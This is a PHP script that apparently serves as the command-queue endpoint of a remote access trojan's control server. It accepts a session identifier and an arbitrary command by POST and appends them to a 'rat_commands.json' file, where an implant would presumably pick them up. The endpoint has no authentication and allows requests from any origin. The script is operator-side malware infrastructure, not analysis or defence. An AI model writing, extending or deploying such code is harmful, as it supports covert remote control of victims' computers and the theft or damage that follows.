<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Invalid method']);
    exit;
}

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (!isset($data['session']) || !isset($data['command'])) {
    echo json_encode(['success' => false, 'error' => 'Missing parameters']);
    exit;
}

// Load commands
$commands = ['commands' => []];
if (file_exists('data/rat_commands.json')) {
    $commands = json_decode(file_get_contents('data/rat_commands.json'), true);
    if (!$commands) $commands = ['commands' => []];
}

// Add command
$commands['commands'][] = [
    'session' => $data['session'],
    'command' => $data['command'],
    'timestamp' => date('Y-m-d H:i:s'),
    'executed' => false
];

// Save
file_put_contents('data/rat_commands.json', json_encode($commands, JSON_PRETTY_PRINT));

echo json_encode(['success' => true, 'message' => 'Command queued']);
?>